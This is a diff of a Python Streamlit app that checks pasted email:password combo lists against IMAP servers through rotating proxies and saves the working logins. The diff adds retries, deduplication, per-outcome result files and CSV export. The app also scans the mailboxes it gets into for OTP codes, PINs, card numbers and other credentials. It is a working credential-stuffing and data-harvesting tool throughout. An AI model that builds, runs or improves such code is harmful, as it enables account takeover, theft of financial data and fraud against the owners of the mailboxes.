-                else:
-                    try:
-                        body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
-                    except Exception:
-                        pass
-
-                if is_extortion_spam(subject, body_text, frm):
-                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ EXCLUDED: Extortion / Ransom Spam detected.")
-                    continue
-
-                cleaned_body = clean_boilerplate(body_text)
-                pins, links = extract_pins_and_links(body_text)
-                cards, creds = extract_credentials_and_cards(body_text)
-                detected_categories = detect_specific_categories(subject, body_text, frm, pins, cards, creds)
-                is_bot = len(detected_categories) > 0
-
-                folder_matches_count += 1
-                messages.append({
-                    "id": mid.decode(),
-                    "folder": f_label,
-                    "from": frm,
-                    "to": to_hdr,
-                    "subject": subject,
-                    "date": date_val,
-                    "is_read": is_read,
-                    "is_bot": is_bot,
-                    "categories": detected_categories,
-                    "body": cleaned_body,
-                    "pins": pins,
-                    "links": links,
-                    "cards": cards,
-                    "creds": creds,
-                    "raw": raw_msg_bytes,
-                    "flags": flags_str,
-                    "size_bytes": len(raw_msg_bytes)
-                })
-
-                fetch_elapsed = round((time.time() - msg_start) * 1000, 2)
-                log_func(
-                    f"  │   ├─ [Msg #{idx} | ID: {mid.decode()}] Parsed in {fetch_elapsed}ms | Size: {len(raw_msg_bytes)}B | "
-                    f"From: '{frm}' | To: '{to_hdr}' | Subject: '{subject}' | "
-                    f"Flags: {flags_str} | Categories={detected_categories} | Pins={pins} | Cards={cards}"
-                )
-
-            total_matched_all_folders += folder_total_count
-            log_func(f"  ├─ [MATCHES COUNT] Verified {folder_matches_count} matching messages in '{f_label}'.")
+            log_func(f"  ├─ [FOLDER MATCHES] '{f_label}' returned {len(ids)} IDs.")
+            for mid in ids:
+                collected.append((f_label, mid))
 
         except (socket.timeout, TimeoutError):
             log_func(f"  └─ ❌ [TIMEOUT ERROR] Folder '{f_label}' timed out during IMAP search.")
-        except MsVerdict as mv:                                     # v13.37
+        except MsVerdict as mv:
             log_func(f"  └─ ❌ [MICROSOFT VERDICT] {mv.verdict}: {mv.detail}")
             raise
         except Exception as ex:
             log_func(f"  └─ ❌ [EXCEPTION ERROR] Querying folder '{f_label}' failed: {ex}")
 
+    total_matched_all_folders = len(collected)
+
+    # ------------------------------------------------------------------
+    # PHASE 2 - one global slice, clamped so an out-of-range page still shows
+    # something instead of a blank screen.
+    # ------------------------------------------------------------------
+    total_pages_here = max(1, math.ceil(total_matched_all_folders / max(1, page_size)))
+    page_number = max(1, min(int(page_number or 1), total_pages_here))
+    start_idx = (page_number - 1) * page_size
+    end_idx = start_idx + page_size
+    target_slice = collected[start_idx:end_idx]
+
+    log_func(f"  ├─ [PAGINATION RANGE] Global matches: {total_matched_all_folders} | Page {page_number}/{total_pages_here} | Slice ({start_idx}:{end_idx}) = {len(target_slice)} IDs")
+
+    last_sel = None
+    for idx, (f_label, mid) in enumerate(target_slice, 1):
+        try:
+            real_imap_folder = get_imap_path(f_label)
+            real_imap_encoded = encode_imap_utf7(real_imap_folder)
+
+            # v13.41: the return was ignored, so a folder that failed to open
+            # had its messages fetched from whatever was selected before it.
+            # Also skip the re-select while the folder has not changed.
+            if last_sel != real_imap_encoded:
+                sel_typ, sel_data = mail.select(f'"{real_imap_encoded}"', readonly=True)
+                if sel_typ != "OK":
+                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ SELECT '{f_label}' failed "
+                             f"({sel_typ} {sel_data}) - skipped.")
+                    last_sel = None
+                    continue
+                last_sel = real_imap_encoded
+
+            msg_start = time.time()
+
+            # v13.40: BODYSTRUCTURE/ENVELOPE were requested and never parsed.
+            # Cap the body at 256 KB so one huge mail cannot stall the page.
+            typ, msgdata = mail.fetch(mid, "(FLAGS BODY.PEEK[]<0.262144>)")
+
+            if not msgdata or not isinstance(msgdata[0], tuple):
+                log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ FETCH returned empty structure.")
+                continue
+
+            raw_msg_bytes = msgdata[0][1]
+            msg = message_from_bytes(raw_msg_bytes)
+            subject = decode_hdr(msg.get("Subject", ""))
+            frm = decode_hdr(msg.get("From", ""))
+            to_hdr = decode_hdr(msg.get("To", ""))
+            date_val = decode_hdr(msg.get("Date", ""))
+            flags_str = str(msgdata[0][0])
+            is_read = "\\Seen" in flags_str
+
+            # v13.40: text/plain only, so HTML-only mail yielded an empty body.
+            body_text, html_text = "", ""
+            if msg.is_multipart():
+                for part in msg.walk():
+                    ctype = part.get_content_type()
+                    if ctype == "text/plain" and not body_text:
+                        body_text = _part_text(part)
+                    elif ctype == "text/html" and not html_text:
+                        html_text = _part_text(part)
+            else:
+                _single = _part_text(msg)
+                if msg.get_content_type() == "text/html":
+                    html_text = _single
+                else:
+                    body_text = _single
+            if not body_text.strip() and html_text:
+                body_text = html_to_text(html_text)
+
+            if is_extortion_spam(subject, body_text, frm):
+                log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ EXCLUDED: Extortion / Ransom Spam detected.")
+                continue
+
+            cleaned_body = clean_boilerplate(body_text)
+            pins, links = extract_pins_and_links(body_text)
+            if st.session_state.get("otp_regex_chk", True):
+                cards, creds = extract_credentials_and_cards(body_text)
+            else:
+                cards, creds = [], []
+            detected_categories = detect_specific_categories(subject, body_text, frm, pins, cards, creds)
+            is_bot = len(detected_categories) > 0
+
+            messages.append({
+                "id": mid.decode(),
+                "folder": f_label,
+                "from": frm,
+                "to": to_hdr,
+                "subject": subject,
+                "date": date_val,
+                "is_read": is_read,
+                "is_bot": is_bot,
+                "categories": detected_categories,
+                "body": cleaned_body,
+                "body_raw": body_text,
+                "pins": pins,
+                "links": links,
+                "cards": cards,
+                "creds": creds,
+                "raw": raw_msg_bytes,
+                "flags": flags_str,
+                "size_bytes": len(raw_msg_bytes)
+            })
+
+            fetch_elapsed = round((time.time() - msg_start) * 1000, 2)
+            log_func(
+                f"  │   ├─ [Msg #{idx} | ID: {mid.decode()}] Parsed in {fetch_elapsed}ms | Size: {len(raw_msg_bytes)}B | "
+                f"From: '{frm}' | To: '{to_hdr}' | Subject: '{subject}' | "
+                f"Flags: {flags_str} | Categories={detected_categories} | Pins={pins} | Cards={cards}"
+            )
+
+        except (socket.timeout, TimeoutError):
+            log_func(f"  │   └─ ❌ [TIMEOUT ERROR] Message {mid!r} in '{f_label}' timed out.")
+        except MsVerdict as mv:
+            log_func(f"  │   └─ ❌ [MICROSOFT VERDICT] {mv.verdict}: {mv.detail}")
+            raise
+        except Exception as ex:
+            log_func(f"  │   └─ ❌ [EXCEPTION ERROR] Message {mid!r} in '{f_label}' failed: {ex}")
+
     total_elapsed = round(time.time() - start_time, 2)
+
+    # v13.41: the pager must count MATCHES, not the rows on this page.  v13.40
+    # stored len(messages) for SEARCH mode, so total_pages was always 1 and the
+    # Next Page button in the OTP scanner and Deep Search was permanently dead.
+    # The true match total drives the pager; the page row count is stored
+    # separately so the header can show the post-filter reality.
+    page_rows = len(messages)
     if log_target == "SEARCH":
         st.session_state.search_total_matched_count = total_matched_all_folders
+        st.session_state.search_page_rows = page_rows
     elif log_target == "OTP":
         st.session_state.otp_total_matched_count = total_matched_all_folders
+        st.session_state.otp_page_rows = page_rows
     else:
         st.session_state.total_matched_count = total_matched_all_folders
+        st.session_state.stream_page_rows = page_rows
 
     save_session_cache()
-    log_func(f"\n🏁 [ENGINE COMPLETE] Total retrieved page messages: {len(messages)} / {total_matched_all_folders} matched | Execution time: {total_elapsed}s")
+    log_func(f"\n🏁 [ENGINE COMPLETE] Page messages: {page_rows} | Global matches: "
+             f"{total_matched_all_folders} | Execution time: {total_elapsed}s")
     return messages
-# @@END 026
+# @@END 026 SEARCH_AND_FETCH
 
 
 # @@BLOCK 027 HERO_AND_VALID deps=026
@@ -2075,6 +2334,8 @@ hero(
     "Multi-Field Search, Telegram/Blacklist Filter, Deep Diagnostic Instrumentation.",
     tags=["OTP Scanner", "Card / Debit", "Telegram Filter", "Bot Purge", "Deep Search", "Microsoft XOAUTH2"],
 )
+
+render_flash()
 
 st.caption(
     f"Advanced IMAP Client with Interactive Bot Intelligence, Dedicated OTP, Debit/Credit Card & "
@@ -2090,7 +2351,7 @@ valid = load_valid()
 # --- Account Deletion Manager ---
 with st.expander("🗑️ Account Deletion Manager", expanded=False):
     st.markdown("#### Permanent Account Deletion Options")
-    clean_valid_accounts_list = [l for l in valid if not l.startswith("# Found:")]
+    clean_valid_accounts_list = valid_combos(valid)
 
     if clean_valid_accounts_list:
         del_action_mode = st.selectbox(
@@ -2125,7 +2386,7 @@ with st.expander("🗑️ Account Deletion Manager", expanded=False):
                 if st.button("🗑️ Permanently Delete Selected Account(s)", type="primary", use_container_width=True):
                     for acc in selected_accounts_to_delete:
                         delete_specific_account_from_storage(acc)
-                    st.success(f"Permanently deleted {len(selected_accounts_to_delete)} account(s)!")
+                    flash(f"Permanently deleted {len(selected_accounts_to_delete)} account(s).")
                     save_session_cache()
                     st.rerun()
 
@@ -2135,7 +2396,7 @@ with st.expander("🗑️ Account Deletion Manager", expanded=False):
             if confirm_all:
                 if st.button("🚨 Permanently Delete ALL Accounts", type="primary", use_container_width=True):
                     clear_all_valid_accounts_storage()
-                    st.success("Permanently deleted all valid accounts!")
+                    flash("Permanently deleted all valid accounts.")
                     save_session_cache()
                     st.rerun()
     else:
@@ -2206,8 +2467,8 @@ st.sidebar.checkbox(
          "v13.37: the node is PROBED against the target host first and rotated on failure."
 )
 
-if valid:
-    clean_download_lines = [line for line in valid if not line.startswith("# Found:")]
+clean_download_lines = valid_combos(valid)
+if clean_download_lines:
     valid_text_data = "\n".join(clean_download_lines)
     st.sidebar.download_button(
         label="📥 Download Valid Mail List",
@@ -2236,7 +2497,13 @@ with st.sidebar.expander("⚙️ App Configuration Settings", expanded=False):
     new_timeout = st.number_input("Connection Timeout (seconds)", min_value=5, max_value=300, value=cfg.get("connection_timeout", 15))
     new_port = st.number_input("Default IMAP Port", min_value=1, max_value=65535, value=cfg.get("imap_port", 993))
     new_fallback = st.checkbox("Enable Auto-Fallback Host Probing (Spectrum/Charter/TWC)", value=cfg.get("auto_fallback_probing", True))
-    new_starttls = st.checkbox("Try STARTTLS / plaintext on port 143 if 993 fails", value=cfg.get("try_starttls", True))
+    new_starttls = st.checkbox(
+        "Try STARTTLS upgrade on port 143 (plaintext 143 still tried either way)",
+        value=cfg.get("try_starttls", True),
+        help="Ticked: the ladder is implicit-TLS on the configured port, then STARTTLS on 143, "
+             "then cleartext 143. Unticked: the STARTTLS rung is skipped entirely, but the "
+             "cleartext 143 rung still runs so legacy servers stay reachable."
+    )
     new_altuser = st.checkbox("Try local-part username on auth failure", value=cfg.get("try_alt_username", True))
     # v13.39: allow_self_signed existed in app_config.json and was read by nothing.
     new_selfsigned = st.checkbox(
@@ -2260,6 +2527,18 @@ with st.sidebar.expander("⚙️ App Configuration Settings", expanded=False):
 
 
 # @@BLOCK 032 SIDEBAR_BATCH deps=031
+def append_result(kind: str, line: str) -> None:
+    """Append one outcome to its results file. v13.40: only VALID was ever
+    persisted; WRONG / APPASS / FAILED vanished on refresh."""
+    path = f"mail_results/{kind}.txt"
+    try:
+        os.makedirs("mail_results", exist_ok=True)
+        with open(path, "a", encoding="utf-8") as f:
+            f.write(line + "\n")
+    except Exception:
+        pass
+
+
 # Batch Account Importer & Validator Bar
 st.sidebar.markdown("---")
 st.sidebar.subheader("📋 Batch Account Importer & Validator")
@@ -2277,7 +2556,15 @@ batch_host_override_input = st.sidebar.text_area(
 )
 
 if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", use_container_width=True):
-    lines = [l.strip() for l in batch_paste_input.splitlines() if l.strip() and not l.strip().startswith("#")]
+    raw_lines = [l.strip() for l in batch_paste_input.splitlines() if l.strip() and not l.strip().startswith("#")]
+    # v13.40: duplicates were re-validated and re-tabled.
+    _seen, lines = set(), []
+    for _l in raw_lines:
+        _k = _l.split("|")[0].strip().lower()
+        if _k and _k not in _seen:
+            _seen.add(_k)
+            lines.append(_l)
+
     if not lines:
         st.sidebar.error("Please paste at least one account in email:password format.")
     else:
@@ -2305,6 +2592,7 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
         active_proxy_pool = load_app_proxies() or [{"proxy": None, "country": "Direct", "region": "-"}]
 
         for idx, line in enumerate(lines):
+          try:
             clean_line = line.split("|")[0].strip()
             row_time = datetime.now().strftime("%H:%M:%S")
             proxy_item = active_proxy_pool[idx % len(active_proxy_pool)]
@@ -2324,22 +2612,43 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
             email_val = email_val.strip()
             pass_val = pass_val.strip()
 
+            # v13.40: 'foo:bar' was dialled against imap.gmail.com.
+            if "@" not in email_val or "." not in email_val.split("@")[-1] or not pass_val:
+                failed_count += 1
+                batch_logs.append(f"❌ [{row_time}] [SKIPPED] Not a usable email:pass — {clean_line}")
+                table_rows.append({
+                    "Time": row_time,
+                    "Status": "FAILED",
+                    "Email:Password": clean_line,
+                    "Under-The-Hood Background Trace": "Rejected before dialling: missing '@', a dotted domain, or an empty password"
+                })
+                continue
+
             status_display.text(f"Testing ({idx+1}/{len(lines)}): {email_val} via {proxy_item['proxy']}")
             progress_bar.progress((idx + 1) / len(lines))
 
             domain_lower = email_val.split("@")[-1].lower() if "@" in email_val else ""
 
+            cfg_fallback = st.session_state.app_config.get("auto_fallback_probing", True)
             if user_host_overrides:
                 hosts_to_test = list(user_host_overrides)
                 for h in candidate_hosts(email_val):
                     if h not in hosts_to_test:
                         hosts_to_test.append(h)
-            else:
+            elif cfg_fallback:
                 hosts_to_test = candidate_hosts(email_val)
+            else:
+                # v13.40: auto_fallback_probing was saved and never read.
+                _d = email_val.split("@")[-1].lower() if "@" in email_val else ""
+                hosts_to_test = [f"imap.{_d}"] if _d else []
 
             # Zero-access guard: never let the loop be a no-op
             if not hosts_to_test:
                 hosts_to_test = [f"imap.{domain_lower}", f"mail.{domain_lower}", domain_lower]
+
+            # v13.40: proton/tuta were dialled on ~20 dead hosts first.
+            if domain_lower in ZERO_ACCESS_PROVIDERS:
+                hosts_to_test = hosts_to_test[:1]
 
             is_success = False
             status_type = "FAILED"
@@ -2351,13 +2660,26 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
 
             users_to_try = username_candidates(email_val) if cfg_alt_user else [email_val]
 
-            for h in hosts_to_test:
+            # v13.40: cap the ladder. 20 hosts x 2 users x 15 s looked hung.
+            max_hosts = 6 if not user_host_overrides else 12
+            for h in hosts_to_test[:max_hosts]:
                 test_m = None
                 try:
                     trace_steps.append(f"Attempting IMAP TLS -> Host: {h}:{cfg_port} (STARTTLS/plain fallback enabled)")
-                    test_m = connect_and_login(h, cfg_port, cfg_timeout,
-                                               proxy_item.get("proxy"),
-                                               users_to_try, pass_val, email_val)
+                    _retries = max(0, int(st.session_state.app_config.get("max_batch_retries", 1)))
+                    test_m = None
+                    for _attempt in range(_retries + 1):
+                        try:
+                            test_m = connect_and_login(h, cfg_port, cfg_timeout,
+                                                       proxy_item.get("proxy"),
+                                                       users_to_try, pass_val, email_val)
+                            break
+                        except MsVerdict:
+                            raise
+                        except Exception as _re:
+                            if _attempt >= _retries or not _looks_like_network_error(str(_re)):
+                                raise
+                            trace_steps.append(f"Retry {_attempt + 1}/{_retries} on {h}: {_re}")
                     trace_steps.append(f"Authenticated as '{email_val}'")
                     test_m.logout()
                     connected_h = h
@@ -2386,7 +2708,11 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                         except Exception:
                             pass
 
-            full_trace = f"Proxy: {proxy_item['proxy']} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Host: {connected_h or hosts_to_test[0]} | Port: {cfg_port} | Steps Executed: " + " | ".join(trace_steps)
+            if not is_success and ms_verdict is None and not err_msg:
+                err_msg = "no host answered"
+
+            _path = st.session_state.get("_last_socket_path", "direct")
+            full_trace = f"Proxy: {proxy_item['proxy']} | Path: {_path} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Host: {connected_h or (hosts_to_test[0] if hosts_to_test else '-')} | Port: {cfg_port} | Steps Executed: " + " | ".join(trace_steps)
 
             if is_success:
                 valid_count += 1
@@ -2394,13 +2720,15 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                 combo_str = f"{email_val}:{pass_val}"
                 new_valid_entries.append(f"{combo_str} | Found: {found_timestamp}")
                 batch_logs.append(f"✅ [{row_time}] [VALID] {email_val} via {connected_h} [Proxy: {proxy_item['proxy']} ({proxy_item['country']}, {proxy_item['region']})]")
-            elif ms_verdict is not None:                   # v13.37
+            elif ms_verdict is not None:
                 if ms_verdict.verdict == "WRONG":
                     wrong_count += 1
                     status_type = "WRONG"
+                    append_result("wrong_passwords", f"{email_val}:{pass_val} | {ms_verdict.detail}")
                 else:
                     appass_count += 1
                     status_type = "APPASS"
+                    append_result("app_password_2fa", f"{email_val}:{pass_val} | {ms_verdict.detail}")
                 batch_logs.append(f"{'❌' if status_type == 'WRONG' else '🔑'} [{row_time}] [{status_type}] {email_val} — {ms_verdict.detail}")
             else:
                 # App-password wins over auth, network errors never count as WRONG
@@ -2408,25 +2736,30 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                 if domain_lower in ZERO_ACCESS_PROVIDERS:
                     appass_count += 1
                     status_type = "APPASS"
+                    append_result("app_password_2fa", f"{email_val}:{pass_val} | no standard IMAP endpoint")
                     batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — provider has no standard IMAP (needs app password / bridge)")
                 elif _looks_like_app_password_error(classify_src):
                     appass_count += 1
                     status_type = "APPASS"
+                    append_result("app_password_2fa", f"{email_val}:{pass_val} | {classify_src}")
                     batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — {classify_src}")
                 elif _looks_like_auth_error(classify_src) and not _looks_like_network_error(classify_src):
                     wrong_count += 1
                     status_type = "WRONG"
+                    append_result("wrong_passwords", f"{email_val}:{pass_val} | {classify_src}")
                     batch_logs.append(f"❌ [{row_time}] [WRONG] {email_val} — {classify_src}")
-                elif _looks_like_login_drop(classify_src):        # v13.39
+                elif _looks_like_login_drop(classify_src):
                     login_drop_count += 1
                     failed_count += 1
                     status_type = "LOGIN_DROPPED"
+                    append_result("login_dropped_retry", f"{email_val}:{pass_val} | {classify_src}")
                     batch_logs.append(
                         f"🚪 [{row_time}] [LOGIN_DROPPED] {email_val} — server answered then closed "
                         f"the socket (* BYE); the password is still UNTESTED — {classify_src}")
                 else:
                     failed_count += 1
                     status_type = "FAILED"
+                    append_result("connection_failed", f"{email_val}:{pass_val} | {err_msg}")
                     batch_logs.append(f"⚠️ [{row_time}] [FAILED] {email_val} — {err_msg}")
 
             table_rows.append({
@@ -2434,6 +2767,16 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                 "Status": status_type,
                 "Email:Password": f"{email_val}:{pass_val}",
                 "Under-The-Hood Background Trace": full_trace
+            })
+          except Exception as row_ex:
+            # v13.40: one unexpected row error used to abort the whole batch.
+            failed_count += 1
+            batch_logs.append(f"⚠️ [{datetime.now().strftime('%H:%M:%S')}] [FAILED] {line} — row error: {row_ex}")
+            table_rows.append({
+                "Time": datetime.now().strftime("%H:%M:%S"),
+                "Status": "FAILED",
+                "Email:Password": line,
+                "Under-The-Hood Background Trace": f"Row-level exception: {row_ex}"
             })
 
         progress_bar.empty()
@@ -2467,7 +2810,7 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
             merge_into_clean_valid(new_valid_entries[1:])
 
         save_session_cache()
-        st.sidebar.success(f"Batch validation complete! Valid: {valid_count}, Invalid/Failed: {failed_count + wrong_count}")
+        flash(f"Batch validation complete. Valid: {valid_count}, Wrong: {wrong_count}, AppPass: {appass_count}, Dropped: {login_drop_count}, Failed: {failed_count}")
         st.rerun()
 # @@END 032
 
@@ -2489,16 +2832,18 @@ with tab_analytics:
         st.success(f"🎉 Check Complete! Started: {meta['started']} | Ended: {meta['ended']} | Duration: {meta['duration']}")
 
     stats = st.session_state.batch_stats
-    a_col1, a_col2, a_col3, a_col4, a_col5 = st.columns(5)
-    with a_col1:
+    # v13.40: five metrics side by side are ~70px each on a phone.
+    a_row1 = st.columns(3)
+    a_row2 = st.columns(2)
+    with a_row1[0]:
         st.metric("✅ Valid", stats.get("valid", 0))
-    with a_col2:
+    with a_row1[1]:
         st.metric("❌ Wrong", stats.get("wrong", 0))
-    with a_col3:
+    with a_row1[2]:
         st.metric("🔑 AppPass", stats.get("appass", 0))
-    with a_col4:
-        st.metric("🚪 Dropped", stats.get("login_dropped", 0))      # v13.39
-    with a_col5:
+    with a_row2[0]:
+        st.metric("🚪 Dropped", stats.get("login_dropped", 0))
+    with a_row2[1]:
         st.metric("⚠️ Failed", stats.get("failed", 0))
 
     if stats.get("login_dropped"):
@@ -2516,6 +2861,18 @@ with tab_analytics:
             column_order=("Time", "Status", "Email:Password", "Under-The-Hood Background Trace"),
             use_container_width=True,
             hide_index=True
+        )
+        # v13.40: results were session-only with no export.
+        _csv = io.StringIO()
+        _w = csv.DictWriter(_csv, fieldnames=["Time", "Status", "Email:Password", "Under-The-Hood Background Trace"])
+        _w.writeheader()
+        _w.writerows(st.session_state.batch_results_table)
+        st.download_button(
+            "⬇️ Download This Run (CSV)",
+            data=_csv.getvalue(),
+            file_name=f"batch_run_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
+            mime="text/csv",
+            use_container_width=True,
         )
     else:
         st.caption("No table results available yet.")
@@ -2580,13 +2937,22 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
             found_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             new_entry_line = f"{combo} | Found: {found_timestamp}\n"
 
-            existing_content = ""
+            # v13.40: every login prepended another copy of the same account.
+            _keep = []
             if os.path.exists(MANUAL_VALID_FILE):
                 with open(MANUAL_VALID_FILE, "r", encoding="utf-8", errors="ignore") as f:
-                    existing_content = f.read()
+                    for _ln in f:
+                        _raw = _ln.strip()
+                        if not _raw or _raw.startswith("#"):
+                            continue
+                        _c = _raw.split(" | ", 1)[0].split("|", 1)[0].strip()
+                        if _c.lower() == combo.lower():
+                            continue
+                        _keep.append(_ln if _ln.endswith("\n") else _ln + "\n")
 
             with open(MANUAL_VALID_FILE, "w", encoding="utf-8") as f:
-                f.write(new_entry_line + existing_content)
+                f.write(new_entry_line)
+                f.writelines(_keep)
 
             save_last_account(combo)
             st.session_state.forced_account = combo
@@ -2597,7 +2963,7 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
             if combo in valid_dropdown_options:
                 st.session_state["selected_account"] = combo
             save_session_cache()
-            st.sidebar.success(f"Connected: {connected_host} ({len(discovered_folders)} folders)")
+            flash(f"Connected: {connected_host} ({len(discovered_folders)} folders)")
             st.rerun()
         else:
             st.sidebar.error(f"❌ Login failed: {last_err}")
@@ -2609,7 +2975,9 @@ active_email, active_password = "", ""
 if actual_pick != "none" and ":" in actual_pick:
     active_email, active_password = actual_pick.split(":", 1)
 
-override = st.session_state.custom_host.strip()
+# v13.40: 'override' was assigned and never used; show the effective host instead.
+if active_email:
+    st.caption(f"Effective host: `{resolve_active_host(active_email) or '(none)'}` · port {st.session_state.app_config.get('imap_port', 993)}")
 
 if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width=True):
     if active_email and active_password:
@@ -2624,7 +2992,8 @@ if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width
                 st.session_state.current_page = 1
                 st.session_state.bot_filter_mode = False
                 save_session_cache()
-                st.sidebar.success("Inbox refreshed successfully!")
+                flash("Inbox refreshed successfully.")
+                st.rerun()
         except MsVerdict as mv:                            # v13.37
             st.sidebar.error(f"{mv.verdict}: {mv.detail}")
         except Exception as e:
@@ -2687,7 +3056,8 @@ if st.button("Connect & Discover Folders", type="primary", use_container_width=T
             st.session_state.mb_folders = folders
             save_session_cache()
             log(f"Discovered {len(folders)} folders via {connected_host}")
-            st.success(f"Connected: {connected_host} ({len(folders)} folders) — path: {_conn_path()}")
+            flash(f"Connected: {connected_host} ({len(folders)} folders) — path: {_conn_path()}")
+            st.rerun()
         else:
             if acc_email.split("@")[-1].lower() in ZERO_ACCESS_PROVIDERS:
                 st.error(f"{last} — this provider has no standard IMAP endpoint (needs an app password / bridge).")
@@ -2724,8 +3094,11 @@ if st.button("📂 Load Folder Messages", type="primary", use_container_width=Tr
                 st.session_state.current_messages = msgs
                 st.session_state.current_page = 1
                 st.session_state.bot_filter_mode = False
+                st.session_state.stream_page_size = page_size
                 save_session_cache()
                 log(f"Loaded {len(msgs)} messages from folder '{folder}'.")
+                flash(f"Loaded {len(msgs)} messages from '{folder}'.")
+                st.rerun()
         except Exception as e:
             st.error(str(e))
 # @@END 037
@@ -2733,30 +3106,38 @@ if st.button("📂 Load Folder Messages", type="primary", use_container_width=Tr
 
 # @@BLOCK 038 MAIN_STREAM deps=037
 # Main Message Stream
-if st.session_state.bot_filter_mode:
+_bot_mode = bool(st.session_state.bot_filter_mode)
+if _bot_mode:
     active_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
     st.info("⚠️ Message stream is currently filtered to show DETECTED BOT/SPAM/TELEGRAM/BLACKLIST MESSAGES ONLY.")
 else:
     active_msgs = st.session_state.current_messages
 
-total_msgs = st.session_state.total_matched_count or len(active_msgs)
+# v13.41: in bot mode total_msgs was len(active_msgs) - the PAGE slice - so
+# total_pages was always 1 and both pager buttons were dead. The pager is driven
+# by the server match total; the bot count on this page is reported separately.
+if _bot_mode:
+    page_size = st.session_state.get("stream_page_size", page_size)
+    total_msgs = st.session_state.total_matched_count or len(active_msgs)
+    st.caption(f"🤖 {sum(1 for m in active_msgs if m.get('is_bot'))} bot message(s) on this page "
+               f"of {len(active_msgs)} loaded. Filtering is applied per page, so a page can be short.")
+else:
+    total_msgs = st.session_state.total_matched_count or len(active_msgs)
 
 if len(active_msgs) > 0:
     st.markdown("---")
 
-    total_pages = max(1, math.ceil(total_msgs / page_size))
-    curr_p = st.session_state.current_page
+    total_pages = max(1, math.ceil(total_msgs / max(1, page_size)))
+    # v13.40: an out-of-range counter disabled both pager buttons and stranded
+    # the user on an empty page.
+    curr_p = max(1, min(int(st.session_state.current_page or 1), total_pages))
+    st.session_state.current_page = curr_p
 
     with st.expander(f"✉️ Main Message Stream — Page {curr_p} of {total_pages} ({total_msgs} Total Matches)", expanded=False):
         st.markdown(f"**Showing Page {curr_p} of {total_pages} (Total Server Matches: {total_msgs})**")
 
         for idx, msg in enumerate(active_msgs):
-            status_icon = "📖" if msg["is_read"] else "📩"
-            cat_list = msg.get("categories", [])
-            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
-            folder_badge = f" [{msg['folder']}]"
-
-            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
+            with st.expander(msg_label(msg, idx), expanded=False):
                 st.write(f"**Folder:** {msg['folder']}")
                 st.write(f"**From:** {msg['from']}")
                 st.write(f"**To:** {msg['to']}")
@@ -2794,7 +3175,7 @@ if len(active_msgs) > 0:
                                 m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                 msg["is_read"] = True
                                 save_session_cache()
-                                st.success("Marked as read!")
+                                flash("Marked as read.")
                                 st.rerun()
                             except Exception as ex:
                                 st.error(str(ex))
@@ -2807,7 +3188,7 @@ if len(active_msgs) > 0:
                             move_message(m_client, msg["folder"], msg["id"], target_move)
                             st.session_state.current_messages.remove(msg)
                             save_session_cache()
-                            st.success(f"Moved to {target_move}!")
+                            flash(f"Moved to {target_move}.")
                             st.rerun()
                         except Exception as ex:
                             st.error(str(ex))
@@ -2822,7 +3203,7 @@ if len(active_msgs) > 0:
                             m_client.expunge()
                             st.session_state.current_messages.remove(msg)
                             save_session_cache()
-                            st.success("Deleted message!")
+                            flash("Message deleted.")
                             st.rerun()
                         except Exception as ex:
                             st.error(str(ex))
@@ -2939,26 +3320,24 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                     st.session_state.otp_current_page = 1
                     save_session_cache()
                     otp_log(f"Scan complete. Retrieved {st.session_state.otp_total_matched_count} matching messages.")
+                    flash(f"Security scan complete. Found {st.session_state.otp_total_matched_count} message(s).")
+                    st.rerun()
             except Exception as e:
                 st.error(str(e))
 
     st.markdown("#### 🔒 Standalone Security & Card Message Stream")
     otp_msgs = [m for m in st.session_state.otp_messages if not should_blacklist_message(m, otp_blacklist_input)]
-    otp_total = len(otp_msgs)
+    otp_total = st.session_state.get("otp_total_matched_count", len(otp_msgs))
 
     if len(otp_msgs) > 0:
-        otp_total_pages = max(1, math.ceil(otp_total / otp_page_size))
-        otp_curr_p = st.session_state.otp_current_page
+        otp_total_pages = max(1, math.ceil(otp_total / max(1, otp_page_size)))
+        otp_curr_p = max(1, min(int(st.session_state.otp_current_page or 1), otp_total_pages))
+        st.session_state.otp_current_page = otp_curr_p
 
         st.markdown(f"**Showing Page {otp_curr_p} of {otp_total_pages} (Total Security Matches: {otp_total})**")
 
         for idx, msg in enumerate(otp_msgs):
-            status_icon = "📖" if msg["is_read"] else "📩"
-            cat_list = msg.get("categories", [])
-            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
-            folder_badge = f" [{msg['folder']}]"
-
-            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
+            with st.expander(msg_label(msg, idx), expanded=False):
                 st.write(f"**Folder:** {msg['folder']}")
                 st.write(f"**From:** {msg['from']}")
                 st.write(f"**To:** {msg['to']}")
